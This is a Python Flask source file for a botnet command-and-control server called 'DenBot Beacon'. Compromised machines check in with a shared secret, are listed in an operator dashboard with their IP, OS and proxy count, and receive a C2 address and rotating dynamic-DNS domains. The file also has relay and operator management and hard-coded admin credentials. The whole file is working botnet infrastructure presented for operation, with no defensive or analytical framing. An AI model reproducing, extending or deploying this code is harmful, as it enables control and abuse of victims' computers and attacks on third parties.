#!/usr/bin/env python3
"""
DenBot Beacon Server v4.7
- Multi-operator management with tokens
- Dynamic C2 relay switching
- Persistent logging, domain rotation
- Redundant operation support
"""

import os
import sqlite3
import secrets as pysecrets
from datetime import datetime, timedelta
from functools import wraps
from threading import Lock

from flask import (
    Flask, request, jsonify, render_template_string,
    redirect, url_for, session, abort
)

# === CONFIG ===
DASH_PASSWORD = os.environ.get("DENBOT_DASH_PASSWORD", "mILITARY6776268")
SHARED_SECRET = os.environ.get("DENBOT_SHARED_SECRET", "foxden2026")
FLASK_SECRET = os.environ.get("DENBOT_FLASK_SECRET", pysecrets.token_hex(32))
DB_PATH = os.environ.get("DENBOT_DB", "denbot.db")
LISTEN_HOST = os.environ.get("DENBOT_LISTEN", "0.0.0.0")
LISTEN_PORT = int(os.environ.get("DENBOT_PORT", "8443"))
ONLINE_WINDOW_SEC = 180

DEFAULT_C2 = "176.100.94.8:4444"
DEFAULT_DOMAINS = [
    "synapsenet.duckdns.org",
    "synapsenet2.duckdns.org",
    "synapsenet666.duckdns.org",
]

app = Flask(__name__)
app.secret_key = FLASK_SECRET

state_lock = Lock()


def db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    with db() as conn:
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS bots (
                id            TEXT PRIMARY KEY,
                ip            TEXT,
                os            TEXT,
                version       TEXT,
                proxies_count INTEGER DEFAULT 0,
                status        TEXT,
                last_seen     TEXT
            );
            CREATE TABLE IF NOT EXISTS config (
                key   TEXT PRIMARY KEY,
                value TEXT
            );
            CREATE TABLE IF NOT EXISTS logs (
                id        INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                event     TEXT
            );
            CREATE TABLE IF NOT EXISTS operators (
                id        INTEGER PRIMARY KEY AUTOINCREMENT,
                username  TEXT UNIQUE,
                token     TEXT UNIQUE,
                created   TEXT
            );
            CREATE TABLE IF NOT EXISTS relays (
                id        INTEGER PRIMARY KEY AUTOINCREMENT,
                name      TEXT UNIQUE,
                address   TEXT,
                active    INTEGER DEFAULT 1,
                created   TEXT
            );
        """)
        conn.execute(
            "INSERT OR IGNORE INTO config(key, value) VALUES('c2', ?)",
            (DEFAULT_C2,),
        )
        conn.execute(
            "INSERT OR IGNORE INTO config(key, value) VALUES('domains', ?)",
            (",".join(DEFAULT_DOMAINS),),
        )


def get_config(key, default=""):
    with db() as conn:
        row = conn.execute("SELECT value FROM config WHERE key=?", (key,)).fetchone()
    return row["value"] if row else default


def set_config(key, value):
    with db() as conn:
        conn.execute(
            "INSERT INTO config(key,value) VALUES(?,?) "
            "ON CONFLICT(key) DO UPDATE SET value=excluded.value",
            (key, value),
        )


def log_event(event):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with db() as conn:
        conn.execute("INSERT INTO logs(timestamp, event) VALUES(?, ?)", (now, event))


def get_recent_logs(limit=100):
    with db() as conn:
        rows = conn.execute(
            "SELECT timestamp, event FROM logs ORDER BY id DESC LIMIT ?", (limit,)
        ).fetchall()
    return [f"[{r['timestamp']}] {r['event']}" for r in reversed(rows)]


def verify_operator_token(token):
    with db() as conn:
        row = conn.execute(
            "SELECT username FROM operators WHERE token=?", (token,)
        ).fetchone()
    return row["username"] if row else None


def operator_auth_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        token = request.headers.get("X-Operator-Token") or request.args.get("token")
        if not token or not verify_operator_token(token):
            return jsonify({"status": "unauthorized"}), 401
        return f(*args, **kwargs)
    return wrapper


HTML_DASHBOARD = """
<!DOCTYPE html>
<html>
<head>
    <title>DenBot Beacon v4.7</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; background: #0f0f0f; color: #00ff9d; }
        .container { max-width: 1200px; margin: 40px auto; padding: 20px; }
        .section { margin: 30px 0; border: 1px solid #333; padding: 15px; }
        table { width: 100%; border-collapse: collapse; background: #1a1a1a; }
        th, td { padding: 12px; border: 1px solid #333; text-align: left; }
        th { background: #222; }
        .online { color: #00ff9d; }
        .offline { color: #ff4444; }
        .active { color: #00ff9d; }
        .inactive { color: #ff4444; }
        input { background: #1a1a1a; color: #00ff9d; border: 1px solid #333; padding: 6px; width: 300px; }
        button { background: #222; color: #00ff9d; border: 1px solid #444; padding: 6px 12px; cursor: pointer; margin: 5px; }
        button:hover { background: #333; }
        .row { margin: 12px 0; }
        pre { background: #1a1a1a; padding: 10px; overflow-x: auto; max-height: 300px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>DenBot Beacon v4.7 - Operator Panel</h1>

        <div class="section">
            <h2>Status</h2>
            <p>Online: <span class="online">{{ online_count }}</span> / {{ total_count }} bots</p>
            <p>Current C2: <strong>{{ current_c2 }}</strong></p>
        </div>

        <div class="section">
            <h2>C2 Management</h2>
            <form method="post" action="{{ url_for('api_set_c2') }}">
                <input type="hidden" name="token" value="{{ token }}">
                <input type="text" name="c2" placeholder="relay:port or IP:port" value="{{ current_c2 }}">
                <button type="submit">Update C2</button>
            </form>
        </div>

        <div class="section">
            <h2>Relays</h2>
            <table>
                <tr><th>Name</th><th>Address</th><th>Status</th><th>Created</th></tr>
                {% for relay in relays %}
                <tr>
                    <td>{{ relay['name'] }}</td>
                    <td>{{ relay['address'] }}</td>
                    <td class="{{ 'active' if relay['active'] else 'inactive' }}">{{ 'Active' if relay['active'] else 'Disabled' }}</td>
                    <td>{{ relay['created'] }}</td>
                </tr>
                {% endfor %}
            </table>
        </div>

        <div class="section">
            <h2>Botnet</h2>
            <table>
                <tr><th>ID</th><th>IP</th><th>OS</th><th>Version</th><th>Proxies</th><th>Status</th><th>Last Seen</th></tr>
                {% for bot in bots %}
                <tr>
                    <td>{{ bot['id'] }}</td>
                    <td>{{ bot['ip'] }}</td>
                    <td>{{ bot['os'] }}</td>
                    <td>{{ bot['version'] }}</td>
                    <td>{{ bot['proxies_count'] }}</td>
                    <td class="{{ 'online' if bot['status'] == 'online' else 'offline' }}">{{ bot['status'] }}</td>
                    <td>{{ bot['last_seen'] }}</td>
                </tr>
                {% endfor %}
            </table>
        </div>

        <div class="section">
            <h2>Logs</h2>
            <pre>{% for line in recent_logs %}{{ line }}
{% endfor %}</pre>
        </div>
    </div>
</body>
</html>
"""


def init_default_operator():
    with db() as conn:
        existing = conn.execute("SELECT token FROM operators WHERE username='admin'").fetchone()
        if not existing:
            token = "admin_token_foxden2026"
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            conn.execute(
                "INSERT INTO operators(username, token, created) VALUES(?, ?, ?)",
                ("admin", token, now),
            )
            return token
    return None


def update_bot_status():
    cutoff = (datetime.now() - timedelta(seconds=ONLINE_WINDOW_SEC)).strftime(
        "%Y-%m-%d %H:%M:%S"
    )
    with db() as conn:
        conn.execute("UPDATE bots SET status='offline' WHERE last_seen < ?", (cutoff,))


@app.route("/", methods=["GET"])
def index():
    admin_token = None
    with db() as conn:
        admin = conn.execute("SELECT token FROM operators WHERE username='admin'").fetchone()
        if admin:
            admin_token = admin["token"]

    return jsonify({
        "status": "ok",
        "version": "4.7",
        "admin_token": admin_token,
        "dashboard": f"/operator/dashboard?token={admin_token}" if admin_token else "/operator/dashboard",
        "endpoints": {
            "beacon": "/beacon (POST)",
            "dashboard": "/operator/dashboard",
            "create_operator": "/operator/create_operator",
            "add_relay": "/operator/add_relay",
            "list_relays": "/operator/list_relays",
            "set_c2": "/operator/set_c2"
        }
    })


@app.route("/beacon", methods=["POST"])
def beacon():
    data = request.get_json(silent=True) or {}

    presented = data.get("secret", "")
    if not pysecrets.compare_digest(presented, SHARED_SECRET):
        return jsonify({"status": "forbidden"}), 403

    bot_id = str(data.get("id", "")).strip()[:128]
    if not bot_id:
        return jsonify({"status": "bad_request"}), 400

    ip = (
        request.headers.get("X-Forwarded-For", request.remote_addr or "")
        .split(",")[0]
        .strip()
    )
    os_name = str(data.get("os", "unknown"))[:32]
    version = str(data.get("version", "v4.7"))[:16]
    proxies_count = int(data.get("proxies_count", 0))
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with state_lock, db() as conn:
        conn.execute(
            "INSERT INTO bots(id,ip,os,version,proxies_count,status,last_seen) "
            "VALUES(?,?,?,?,?,?,?) "
            "ON CONFLICT(id) DO UPDATE SET "
            "ip=excluded.ip, os=excluded.os, version=excluded.version, "
            "proxies_count=excluded.proxies_count, status='online', last_seen=excluded.last_seen",
            (bot_id, ip, os_name, version, proxies_count, "online", now),
        )

    log_event(f"beacon {bot_id} {ip} {os_name} v{version}")

    return jsonify(
        {
            "c2": get_config("c2", DEFAULT_C2),
            "domains": get_config("domains", ",".join(DEFAULT_DOMAINS)).split(","),
            "status": "ok",
        }
    )


@app.route("/operator/dashboard")
@operator_auth_required
def operator_dashboard():
    update_bot_status()
    token = request.headers.get("X-Operator-Token") or request.args.get("token")
    with db() as conn:
        bots = conn.execute("SELECT * FROM bots ORDER BY last_seen DESC").fetchall()
        relays = conn.execute(
            "SELECT * FROM relays WHERE active=1 ORDER BY created DESC"
        ).fetchall()

    online_count = sum(1 for b in bots if b["status"] == "online")
    return render_template_string(
        HTML_DASHBOARD,
        bots=[dict(b) for b in bots],
        relays=[dict(r) for r in relays],
        online_count=online_count,
        total_count=len(bots),
        current_c2=get_config("c2", DEFAULT_C2),
        recent_logs=get_recent_logs(50),
        token=token,
    )


@app.route("/operator/set_c2", methods=["POST"])
@operator_auth_required
def api_set_c2():
    new_c2 = (request.form.get("c2") or "").strip()
    if not new_c2:
        return jsonify({"status": "bad_request"}), 400

    set_config("c2", new_c2)
    token = request.headers.get("X-Operator-Token") or request.form.get("token")
    operator = verify_operator_token(token)
    log_event(f"C2 changed to {new_c2} by {operator}")

    return redirect(url_for("operator_dashboard", token=token))


@app.route("/operator/add_relay", methods=["POST"])
@operator_auth_required
def api_add_relay():
    data = request.get_json(silent=True) or {}
    name = (data.get("name") or "").strip()[:64]
    address = (data.get("address") or "").strip()

    if not name or not address:
        return jsonify({"status": "bad_request"}), 400

    token = request.headers.get("X-Operator-Token")
    operator = verify_operator_token(token)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        with db() as conn:
            conn.execute(
                "INSERT INTO relays(name, address, active, created) VALUES(?, ?, ?, ?)",
                (name, address, 1, now),
            )
        log_event(f"Relay {name} added ({address}) by {operator}")
        return jsonify({"status": "ok", "relay": name})
    except sqlite3.IntegrityError:
        return jsonify({"status": "error", "message": "relay already exists"}), 400


@app.route("/operator/list_relays", methods=["GET"])
@operator_auth_required
def api_list_relays():
    with db() as conn:
        relays = conn.execute("SELECT * FROM relays WHERE active=1").fetchall()
    return jsonify({"relays": [dict(r) for r in relays]})


@app.route("/operator/create_operator", methods=["POST"])
@operator_auth_required
def api_create_operator():
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or "").strip()

    if not username or len(username) < 3:
        return jsonify({"status": "bad_request"}), 400

    token = pysecrets.token_urlsafe(32)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        with db() as conn:
            conn.execute(
                "INSERT INTO operators(username, token, created) VALUES(?, ?, ?)",
                (username, token, now),
            )
        requester_token = request.headers.get("X-Operator-Token")
        requester = verify_operator_token(requester_token)
        log_event(f"Operator {username} created by {requester}")
        return jsonify({"status": "ok", "username": username, "token": token})
    except sqlite3.IntegrityError:
        return jsonify({"status": "error", "message": "username already exists"}), 400


if __name__ == "__main__":
    init_db()
    token = init_default_operator()
    display_host = "localhost" if LISTEN_HOST == "0.0.0.0" else LISTEN_HOST
    if token:
        print(f"\n[+] Default admin created: token={token}")
    print(f"\n[+] Beacon Server v4.7 started")
    print(f"[+] Dashboard: http://{display_host}:{LISTEN_PORT}/operator/dashboard?token=admin_token_foxden2026")
    print(f"[+] API: http://{display_host}:{LISTEN_PORT}/\n")
    app.run(host=LISTEN_HOST, port=LISTEN_PORT, debug=False, use_reloader=False)
